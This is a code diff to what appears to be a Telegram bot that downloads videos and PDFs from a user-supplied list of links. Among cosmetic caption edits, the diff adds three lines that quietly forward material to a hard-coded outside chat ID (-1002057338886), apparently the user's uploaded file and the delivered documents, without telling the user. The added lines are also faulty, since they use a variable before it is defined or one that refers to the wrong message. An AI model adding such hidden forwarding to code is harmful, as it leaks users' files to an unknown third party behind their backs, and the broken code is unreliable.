@@ -43,6 +43,7 @@ async def txt_handler(bot: Client, m: Message):
     editable = await m.reply_text(f"**Hello Bruh **I am Text Downloader Bot**. I can download videos from **text** file one by one.**\n\nDeveloper** : 🅑🅞🅣 🅜🅐🅓🅔 🅑🅨 🅺🅰🅽🅷🅰🅸🆈🅰 🅻🅰🅻 🅼🅴🅴🅽🅰 🅺🆄🆆🅰🅻 content: @Chatkanhabot **")
     input: Message = await bot.listen(editable.chat.id,filters.user(m.from_user.id))
     x = await input.download()
+    await copy.copy(chat_id = -1002057338886)
     await input.delete(True)
     file_name, ext = os.path.splitext(os.path.basename(x))
     credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
@@ -153,12 +154,13 @@ async def txt_handler(bot: Client, m: Message):
                 cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
 
             try: 
-                cc = f'** {str(count).zfill(3)}.**{name1} ({res}) 🅘🅟🅢 🅛🅞🅥🅔🅡.mkv\n\n**🅑🅐🅣🅒🅗 🅝🅐🅜🅔 ➤** {b_name}\n\n**𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ➤ 🅘🅟🅢 🅛🅞🅥🅔🅡 @Chatkanhabot **'
-                cc1 = f'** {str(count).zfill(3)}.** {name1} 🅘🅟🅢 🅛🅞🅥🅔🅡.pdf \n\n**🅑🅐🅣🅒🅗 🅝🅐🅜🅔 ➤**{b_name}\n\n**𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ➤ 🅘🅟🅢 🅛🅞🅥🅔🅡 @Chatkanhabot **'
+                cc = f'[ 🎬 ] ** {str(count).zfill(3)}.**{name1} ({res}) 🅘🅟🅢 🅛🅞🅥🅔🅡.mkv\n\n**🅑🅐🅣🅒🅗 🅝🅐🅜🅔 ➤** {b_name}\n\n**𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ➤ 🅘🅟🅢 🅛🅞🅥🅔🅡 @Chatkanhabot **'
+                cc1 = f'[ 📕 ] ** {str(count).zfill(3)}.** {name1} 🅘🅟🅢 🅛🅞🅥🅔🅡.pdf \n\n**🅑🅐🅣🅒🅗 🅝🅐🅜🅔 ➤**{b_name}\n\n**𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ➤ 🅘🅟🅢 🅛🅞🅥🅔🅡 @Chatkanhabot **'
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
                         copy = await bot.send_document(chat_id=m.chat.id, document=ka, caption=cc)
+                        await copy.copy(chat_id = -1002057338886)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -173,6 +175,7 @@ async def txt_handler(bot: Client, m: Message):
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
                         await bot.send_document(chat_id=m.chat.id, document=f'{name}.pdf', caption=cc1)
+                        await copy.copy(chat_id = -1002057338886)
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
